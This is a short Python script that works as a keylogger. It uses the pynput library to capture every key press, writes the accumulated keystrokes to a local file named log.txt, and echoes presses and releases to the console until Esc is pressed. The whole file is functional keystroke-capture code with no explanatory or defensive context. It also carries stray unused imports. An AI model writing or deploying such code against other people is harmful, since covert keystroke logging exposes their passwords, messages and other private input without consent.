from asyncore import write
from distutils.file_util import write_file
import pynput 
from pynput.keyboard import Key, Listener

keys = []



def on_press(key):

    keys.append(key)
    write_file(keys)

    try:
        print('Press key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} passed' .format(key))


def write_file(keys):
    with open('log.txt','w') as f:
        for k in keys:

            k = str(k).replace("'","")
            f.write(k)

def on_release(key):

    print('{0} released'.format(key))
    if key == Key.esc:
        return False 


with Listener(on_press = on_press,
              on_release = on_release) as listener:
                     
    listener.join()